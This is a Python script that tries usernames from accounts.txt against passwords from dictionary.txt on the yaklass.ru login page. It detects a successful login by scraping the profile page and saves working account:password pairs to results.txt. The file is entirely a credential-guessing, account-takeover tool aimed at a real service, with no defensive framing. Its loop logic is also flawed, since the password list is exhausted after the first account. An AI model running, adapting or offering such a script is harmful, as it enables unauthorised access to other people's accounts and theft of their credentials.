import requests
from requests.packages.urllib3 import add_stderr_logger
import urllib
from bs4 import BeautifulSoup
from urllib.error import HTTPError
from urllib.request import urlopen
import re, random, datetime

# proxy = 
add_stderr_logger()

url = "https://www.yaklass.ru"

with open("accounts.txt", "r") as accountFile, open("dictionary.txt", "r") as passwordFile, open("results.txt", "w") as output:
	for accountRow in accountFile:
		for passRow in passwordFile:
			session = requests.Session()
			per_session = session.post(url + "/Account/Login", data={'UserName':accountRow, 'Password':passRow})
			# you can now associate request with beautifulsoup
			try:
				# it assumed that by now you are logged so we can now use .get and fetch any page of your choice
				bsObj = BeautifulSoup(session.get(url + "/Account/EditProfile").content, 'lxml')
				if(str(bsObj.findAll("div", {"class": "important-msg bottom-buffer-20px"})) ==  '[<div class="important-msg bottom-buffer-20px">Для доступа к запрашиваемой странице необходимо войти на сайт или зарегистрироваться</div>]'):
					print("FailedCheck")
				else:
					print("NiceAcc")
					output.write(accountRow[:-1] + ":" + passRow)
			except HTTPError as e:
				print(e)
				
